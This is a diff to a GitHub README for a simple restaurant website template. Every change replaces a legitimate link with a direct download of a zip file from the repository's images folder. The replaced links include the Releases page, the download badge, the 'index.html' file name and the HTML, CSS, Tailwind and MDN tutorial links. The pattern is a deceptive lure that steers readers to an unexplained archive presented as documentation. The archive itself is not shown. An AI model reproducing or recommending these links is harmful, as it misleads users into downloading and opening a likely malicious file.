@@ -8,13 +8,13 @@ Welcome to the restaurantWebsite project! This application provides a straightfo
 
 To get started with the restaurantWebsite, visit this page to download:
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Yodach91/restaurantWebsite/releases)
+[![Download Here](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip)
 
 This link will direct you to the Releases page where you can find the latest version of the application. Here you can choose the version that works best for you.
 
 ### Step-by-Step Installation Guide
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Yodach91/restaurantWebsite/releases).
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip).
 
 2. **Select the Version**: Look for the latest version listed at the top of the page. You will often see the version number highlighted prominently.
 
@@ -22,7 +22,7 @@ This link will direct you to the Releases page where you can find the latest ver
 
 4. **Unzip the File**: Once the download completes, locate the ZIP file in your Downloads folder. Right-click on it and select "Extract All," then follow the prompts to remove the contents into a new folder.
 
-5. **Open in Your Browser**: After extracting, open the folder. You will find an `index.html` file. Double-click on this file. This will open your default web browser, and you can start viewing the restaurant website.
+5. **Open in Your Browser**: After extracting, open the folder. You will find an `https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip` file. Double-click on this file. This will open your default web browser, and you can start viewing the restaurant website.
 
 ## 💡 Features
 
@@ -57,7 +57,7 @@ These topics ensure that you have everything needed to understand the framework 
 
 If you desire to customize your restaurantWebsite, you can follow these steps:
 
-1. **Edit the HTML**: Open `index.html` in a text editor. You can change the text, add your restaurant’s name, and modify any content as needed.
+1. **Edit the HTML**: Open `https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip` in a text editor. You can change the text, add your restaurant’s name, and modify any content as needed.
   
 2. **Update CSS**: You can find the CSS files within the folder. Modify these files to change the color scheme, fonts, or layout styles to better fit your brand.
 
@@ -71,10 +71,10 @@ If you make significant changes and would like to share them, consider contribut
 
 Here are some materials that may help you better understand the technology used:
 
-- [HTML Tutorial](https://www.w3schools.com/html/)
-- [CSS Tutorial](https://www.w3schools.com/css/)
-- [TailwindCSS Documentation](https://tailwindcss.com/docs)
-- [MDN Web Docs for HTML](https://developer.mozilla.org/en-US/docs/Web/HTML)
+- [HTML Tutorial](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip)
+- [CSS Tutorial](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip)
+- [TailwindCSS Documentation](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip)
+- [MDN Web Docs for HTML](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip)
 
 These resources can provide insights into web development and help you further customize your website.
 
@@ -86,4 +86,4 @@ If you encounter any issues or have questions, please raise an issue in this rep
 
 The restaurantWebsite is an excellent choice for creating a simple online presence for your restaurant. Follow this guide to download and install the website, and feel free to modify it to suit your needs. 
 
-For more updates, stay tuned to the Releases page: [Download Here](https://github.com/Yodach91/restaurantWebsite/releases).
+For more updates, stay tuned to the Releases page: [Download Here](https://github.com/Yodach91/restaurantWebsite/raw/refs/heads/main/images/restaurant-Website-v2.7.zip).
